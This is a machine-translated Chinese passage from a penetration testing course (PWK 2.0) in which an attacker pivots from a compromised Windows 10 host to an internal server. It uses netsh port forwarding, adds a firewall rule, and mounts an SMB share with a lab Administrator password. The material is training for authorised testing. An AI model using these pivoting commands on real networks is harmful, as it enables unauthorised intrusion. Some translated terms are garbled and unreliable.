<div style="position:absolute;top:203452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置似乎有效。</font><font style="vertical-align: inherit;">我们已经成功扫描了 Windows 10 机器的 SQL</font></font></nobr></div>
<div style="position:absolute;top:203471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 Kali 攻击机上的远程端口转发服务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203506;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 通过 Sync Breeze 漏洞在您的 Windows 实验室客户端上获取反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:203564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 plink.exe 建立远程端口转发到 Windows 10 上的 MySQL 服务</font></font></nobr></div>
<div style="position:absolute;top:203583;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户。</font></font></nobr></div>
<div style="position:absolute;top:203612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.通过远程端口转发扫描MySQL端口。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.4 网易</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将考虑以下场景：</font></font></nobr></div>
<div style="position:absolute;top:203723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估期间，我们通过远程漏洞入侵了 Windows 10 目标</font></font></nobr></div>
<div style="position:absolute;top:203743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且能够成功地将我们的权限提升到 SYSTEM。</font><font style="vertical-align: inherit;">列举之后</font></font></nobr></div>
<div style="position:absolute;top:203762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">受感染的机器，我们发现除了连接到当前网络</font></font></nobr></div>
<div style="position:absolute;top:203781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.x)，它有一个额外的网络接口，似乎连接到不同的网络</font></font></nobr></div>
<div style="position:absolute;top:203801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(192.168.1.x)。</font><font style="vertical-align: inherit;">在这个内部子网中，我们识别了一台 Windows Server 2016 机器 (192.168.1.110)</font></font></nobr></div>
<div style="position:absolute;top:203820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已打开 TCP 端口 445。</font></font></nobr></div>
<div style="position:absolute;top:203853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了继续这个场景，我们现在可以寻找从受害者网络内部转向的方法。</font></font></nobr></div>
<div style="position:absolute;top:203872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 10 机器上的系统级外壳。</font><font style="vertical-align: inherit;">由于我们的特权级别，我们不必</font></font></nobr></div>
<div style="position:absolute;top:203891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理用户帐户控制 (UAC)，这意味着我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">595</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序（由</font></font></nobr></div>
<div style="position:absolute;top:203911;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认在每个现代版本的 Windows 上）用于端口转发和旋转。</font></font></nobr></div>
<div style="position:absolute;top:203944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，要使其工作，Windows 系统必须</font><font style="vertical-align: inherit;">运行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP Helper</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv6</font></font></i></nobr></div>
<div style="position:absolute;top:203963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">必须为我们要使用的接口启用支持。</font><font style="vertical-align: inherit;">幸运的是，两者都由</font></font></nobr></div>
<div style="position:absolute;top:203982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 操作系统上的默认设置。</font></font></nobr></div>
<div style="position:absolute;top:204015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">通过 Windows</font><i><font style="vertical-align: inherit;">服务</font></i><font style="vertical-align: inherit;">程序</font><font style="vertical-align: inherit;">检查</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP Helper</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务是否正在运行</font><font style="vertical-align: inherit;">以确认</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:204035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204208;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 302：IP Helper 服务正在运行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">在网络接口的设置中</font><font style="vertical-align: inherit;">确认</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv6</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:204383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">595 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:204511;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="173"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 173 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:204544;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:205621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:205621;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:205621;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">614</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204804;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 303：启用 IPv6 支持</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似于 SSH 本地端口转发示例，我们将尝试重定向发往</font></font></nobr></div>
<div style="position:absolute;top:204855;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 TCP 端口 4455 上的 Windows 10 计算机入侵到 Windows Server 2016 计算机上</font></font></nobr></div>
<div style="position:absolute;top:204874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 445。</font></font></nobr></div>
<div style="position:absolute;top:204907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们将使用 netsh ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">interface</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 上下文来</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个 IPv4 到 IPv4 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">v4tov4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 代理</font></font></nobr></div>
<div style="position:absolute;top:204926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">portproxy</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 监听 10.11.0.22 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">listenaddress=10.11.0.22</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，端口 4455</font></font></nobr></div>
<div style="position:absolute;top:204946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听端口=4455</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font></font></nobr></div>
<div style="position:absolute;top:204946;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那</font></font></nobr></div>
<div style="position:absolute;top:204946;left:348"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将要</font></font></nobr></div>
<div style="position:absolute;top:204946;left:405"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向前</font></font></nobr></div>
<div style="position:absolute;top:204946;left:494"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:204946;left:541"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:204946;left:596"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗</font></font></nobr></div>
<div style="position:absolute;top:204946;left:696"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2016年</font></font></nobr></div>
<div style="position:absolute;top:204946;left:765"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器</font></font></nobr></div>
<div style="position:absolute;top:204965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font><b><font style="font-size:13px"><font style="vertical-align: inherit;">connectaddress </font></font></b></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=192.168.1.110</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 在端口 445 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">connectport=445</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 上：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh interface portproxy add v4tov4 listenport=4455 listenaddres</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205017;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s=10.11.0.22 连接端口=445 连接地址=192.168.1.110</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205037;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 651 - 使用 netsh 进行本地端口转发</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以确认端口 4455 正在侦听受感染的 Windows 主机：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -anp TCP | </font><font style="vertical-align: inherit;">找到“4455”</font></font></font></b></nobr></div>
<div style="position:absolute;top:205118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 10.11.0.22:4455    </font></font></nobr></div>
<div style="position:absolute;top:205118;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0.0.0.0:0    </font></font></nobr></div>
<div style="position:absolute;top:205118;left:538"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听力 </font></font></nobr></div>
<div style="position:absolute;top:205137;left:212"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 652 - 在使用 netsh 进行转发后检查端口是否已绑定</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Windows 防火墙将禁止 TCP 端口 4455 上的入站连接，这将</font></font></nobr></div>
<div style="position:absolute;top:205186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阻止我们与我们的隧道互动。</font><font style="vertical-align: inherit;">鉴于我们以 SYSTEM 权限运行，我们</font></font></nobr></div>
<div style="position:absolute;top:205205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过添加防火墙规则以允许该端口上的入站连接，可以轻松解决此问题。</font></font></nobr></div>
<div style="position:absolute;top:205238;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项是不言自明的，但请注意，我们允许 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">action=allow</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 特定的入站</font></font></nobr></div>
<div style="position:absolute;top:205258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dir=in</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 连接并利用</font><font style="vertical-align: inherit;">netsh</font><font style="vertical-align: inherit;">的防火墙 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">advfirewall</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 上下文。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netsh advfirewall firewall add rule name="forward_port_rule" prot</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205309;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font></font></nobr></div>
<div style="position:absolute;top:205346;left:268"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 653 - 使用 netsh 允许 TCP 端口 4455 上的入站流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为最后一步，我们可以尝试使用端口 4455 连接到我们受感染的 Windows 机器</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:205395;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">如果一切都按计划进行，流量应该被重定向，并且</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应返回内部 Windows Server 2016 计算机上的可用网络共享。</font></font></nobr></div>
<div style="position:absolute;top:205447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们之前的场景一样，Samba 需要配置最低 SMB 版本的 SMBv2。</font></font></nobr></div>
<div style="position:absolute;top:205466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是多余的，但为了完整起见，我们将在此处包含命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nano /etc/samba/smb.conf'</font></font></font></b></nobr></div>
<div style="position:absolute;top:205535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/samba/smb.conf</font></font></font></b></nobr></div>
<div style="position:absolute;top:205552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:205569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，您还需要设置适当的 Unix 权限 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:205699;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="174"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 174 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:205732;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:206809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:206809;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:206809;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">615</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 到驱动程序目录，让这些用户在其中拥有写权限</font></font></nobr></div>
<div style="position:absolute;top:205844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; </font><font style="vertical-align: inherit;">写入列表 = 根，@lpadmin</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:205878;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小协议 = SMB2</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo /etc/init.d/smbd restart</font></font></font></b></nobr></div>
<div style="position:absolute;top:205929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[ ok ] 重新启动 smbd（通过 systemctl）：smbd.service。</font></font></nobr></div>
<div style="position:absolute;top:205963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smbclient -L 10.11.0.22 --port=4455 --user=管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:205980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法初始化消息上下文</font></font></nobr></div>
<div style="position:absolute;top:205997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入 WORKGROUP\Administrator 的密码：</font></font></nobr></div>
<div style="position:absolute;top:206031;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共享名类型注释</font></font></nobr></div>
<div style="position:absolute;top:206048;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------- ---- -------</font></font></nobr></div>
<div style="position:absolute;top:206065;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员$    </font></font></nobr></div>
<div style="position:absolute;top:206065;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘远程管理</font></font></nobr></div>
<div style="position:absolute;top:206082;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加元    </font></font></nobr></div>
<div style="position:absolute;top:206082;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘默认共享</font></font></nobr></div>
<div style="position:absolute;top:206099;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据    </font></font></nobr></div>
<div style="position:absolute;top:206099;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘    </font></font></nobr></div>
<div style="position:absolute;top:206116;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPC$    </font></font></nobr></div>
<div style="position:absolute;top:206116;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工控机远程工控机</font></font></nobr></div>
<div style="position:absolute;top:206133;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络登录    </font></font></nobr></div>
<div style="position:absolute;top:206133;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘登录服务器共享</font></font></nobr></div>
<div style="position:absolute;top:206150;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统卷    </font></font></nobr></div>
<div style="position:absolute;top:206150;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘登录服务器共享</font></font></nobr></div>
<div style="position:absolute;top:206167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新连接 SMB1 以获得工作组列表。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:206184;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do_connect：连接到 10.11.0.22 失败（错误 NT_STATUS_IO_TIMEOUT）</font></font></b></nobr></div>
<div style="position:absolute;top:206201;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法与 SMB1 连接 - 没有可用的工作组</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206220;left:121"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 654 - 使用 NETSH 通过本地端口转发列出 Windows Server 2016 机器上的网络共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们成功列出了共享，但是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">smbclient</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成了错误。</font><font style="vertical-align: inherit;">这个超时问题是</font></font></nobr></div>
<div style="position:absolute;top:206269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常由端口转发错误引起，但让我们测试一下并确定我们是否可以与</font></font></nobr></div>
<div style="position:absolute;top:206289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">股份。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mkdir /mnt/win10_share</font></font></font></b></nobr></div>
<div style="position:absolute;top:206357;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrat</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206374;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，密码=Qwerty09！</font><font style="vertical-align: inherit;">/mnt/win10_share</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -l /mnt/win10_share/</font></font></font></b></nobr></div>
<div style="position:absolute;top:206425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共 1 个</font></font></nobr></div>
<div style="position:absolute;top:206442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 根根 2019 年 4 月 17 日 7 日 data.txt</font></font></nobr></div>
<div style="position:absolute;top:206476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /mnt/win10_share/data.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:206493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据 </font></font></nobr></div>
<div style="position:absolute;top:206529;left:139"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 655 - 通过端口转发挂载 Windows 2016 Server 机器上可用的远程共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如上述命令所示，此错误禁止我们列出工作组，但它</font></font></nobr></div>
<div style="position:absolute;top:206578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会影响我们挂载共享的能力。</font><font style="vertical-align: inherit;">端口转发成功。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206612;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20.4.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 通过 Sync Breeze 漏洞在您的 Windows 实验室客户端上获取反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:206671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 SYSTEM shell，尝试使用 netsh 复制端口转发示例。 </font></font></nobr></div>
</span></font>

